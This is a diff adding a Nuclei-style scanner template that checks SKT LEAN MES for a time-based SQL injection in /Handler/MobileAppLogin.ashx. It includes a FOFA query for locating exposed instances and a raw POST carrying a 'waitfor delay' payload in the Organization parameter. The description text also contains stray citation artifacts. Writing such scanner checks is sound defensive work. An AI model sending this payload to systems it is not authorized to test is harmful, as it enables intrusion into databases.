@@ -1,0 +1,55 @@
+id: leanmes-mobileapplogin-sqli
+
+info:
+  name: SKT LEAN MES /Handler/MobileAppLogin.ashx - SQL Injection (Time-based)
+  author: iSee857
+  severity: high
+  description: |
+    SKT LEAN MES is affected by a SQL injection vulnerability in /Handler/MobileAppLogin.ashx.
+    When Action=checkmesurl, the Organization parameter is not properly sanitized and can be abused
+    with time-based SQL payloads such as WAITFOR DELAY, allowing attackers to infer database behavior
+    and potentially extract or manipulate sensitive backend data. :contentReference[oaicite:0]{index=0}
+  remediation: |
+    - Apply the vendor patch or upgrade to a fixed version as soon as possible.
+    - Use parameterized queries (prepared statements) for Organization and all other user-controlled parameters.
+    - Enforce strict input validation and only allow expected values/formats.
+    - Restrict access to /Handler/MobileAppLogin.ashx to trusted internal networks and authenticated clients only.
+    - Monitor logs for repeated delay-based probes and suspicious requests to the affected endpoint. :contentReference[oaicite:1]{index=1}
+  impact: |
+    Successful exploitation may allow attackers to disclose sensitive database information,
+    alter application data, and potentially degrade service availability through repeated
+    time-delay queries. :contentReference[oaicite:2]{index=2}
+  reference:
+    - https://mrxn.net/jswz/lean-mes-MobileAppLogin-sqli.html
+  classification:
+    cwe-id: CWE-89
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+  metadata:
+    vendor: skt
+    product: lean-mes
+    verified: false
+    max-request: 1
+    fofa-query: (title="LEAN MES - 用户登录" && body="LEAN MES") || body="Content/js/skt.utility.checkmobile.js" || body="../MobileApp/VerifyError.aspx" || body="Content/login/login2/multiplant_top.png"
+  tags: 深科特-LEAN-MES
+
+http:
+  - method: POST
+    raw:
+      - |
+        POST /Handler/MobileAppLogin.ashx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        Action=checkmesurl&Organization='waitfor delay'0:0:5'--
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration >= 5"
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "账套"
